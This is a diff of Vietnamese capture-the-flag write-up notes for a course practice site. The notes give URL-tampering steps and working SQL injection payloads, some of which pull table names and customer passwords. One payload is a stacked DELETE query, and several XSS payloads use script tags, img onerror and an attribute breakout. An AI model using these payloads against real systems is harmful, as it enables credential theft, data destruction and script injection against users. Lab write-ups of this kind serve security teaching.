@@ -1,11 +1,26 @@
-*CTF3 - Shopping Center
-Hiển thị các bảng ghi của 1 bảng
+###CTF1 -  Customer List
+- Chuyển qua chế độ view-source
+- Lấy link dẫn ở ajax /CTF1/CustomerInfo
+- Chuyển https://64cntt1.ntucoder.net/CTF1/Index ==> https://64cntt1.ntucoder.net/CTF1/CustomerInfo
+
+----------
+
+###CTF2 - Web Pages
+- Sau khi ta tạo 1 trang web
+- Ta thấy index của trang web hiện tại khác 1
+- Tức là trước đó còn trang ẩn
+- chuyển https://64cntt1.ntucoder.net/CTF2/ViewWebPage/105 ==> https://64cntt1.ntucoder.net/CTF2/ViewWebPage/1
+
+----------
+
+###CTF3 - Shopping Center
+-Hiển thị các bảng ghi của 1 bảng
 https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1
 
-Hiển thị tất cả các bảng ghi
+-Hiển thị tất cả các bảng ghi
 https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 OR 1 = 1
 
-Tấn công vào Database
+*Tấn công vào Database
 - Test số cột 1, 2,...,n
 https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', '2', '3', '4'
 - Cột số 2 tên sản phẩm  với table_name
@@ -15,6 +30,7 @@ https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', column
 - Lấy dữ liệu password của Customer
 https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', password, '3', '4' from Customer
 
+----------
 
 ###CTF4 - Picture Gallery
 - Hiển thị tất cả các ảnh 
@@ -28,6 +44,53 @@ https://64cntt1.ntucoder.net/CTF3/Product/?CategoryID=1 union select '1', passwo
 - Xem dữ liệu Password của User
 'union select '1', '2', Email, '4' from Users --
 
+----------
 
-*CTF5 - Missing Card Game
+###CTF5 - Missing Card Game
+- Hãy thi hành lệnh DELETE xóa dữ liệu trong bảng trên để nhận cờ CTF.
 '; DELETE FROM SQL; --
+
+----------
+
+###CTF6 - Hello
+- Chèn thẻ js 
+<script>alert("Đáp án: ")</script>
+
+----------
+
+###CTF7 - Hello Again 
+- Chèn thẻ html để chèn hình ảnh
+<img src=x onerror=alert("Đáp án: ")>
+*Giải thích:
+- Chèn một ảnh vào, giá trị x là một giá trị không hợp lệ (không phải URL ảnh thật).
+- onerror=alert("Đáp án: ") là một thuộc tính sự kiện (event handler) của thẻ <img>. 
+- Thuộc tính onerror được gọi khi trình duyệt không thể tải được ảnh (bị lỗi).
+
+- Chèn thẻ html gọi đến một js
+<a href="javascript:alert("Đáp án: ")">Lấy đáp án</a>
+*Giải thích:
+- Chèn một link vào để người dùng tương tác.
+- javascript:alert("Đáp án: ") chạy trược tiếp js trong thẻ <a>
+
+----------
+
+###CTF8 - Web Pages Again
+- Chèn thẻ html để chèn hình ảnh
+<img src=x onerror=alert(1)>
+*Giải thích:
+- Chèn một ảnh vào, giá trị x là một giá trị không hợp lệ (không phải URL ảnh thật).
+- onerror=alert(1) là một thuộc tính sự kiện (event handler) của thẻ <img>. 
+- Thuộc tính onerror được gọi khi trình duyệt không thể tải được ảnh (bị lỗi).
+
+----------
+
+###CTF9 - Picture Gallery Again
+- Khi ta thử một từ khóa khác ngoài các từ gợi ý
+Ví dụ: amimals 
+- Ta nhận lại 1 kết quả hình lỗi
+<div>
+  <img src='/CTF4Images/animals.jpg' width='400' />
+</div>
+- Vì thế ta sử dụng một thuộc tính sự kiện (event handler) của thẻ <img>: onerror = alert(1)
+- Nhưng để phá vỡ src = '' ta phải chuyển thành: ' onerror = 'alert(1) 
+==> src='/CTF4Images/animals.jpg' onerror = 'alert(1)'
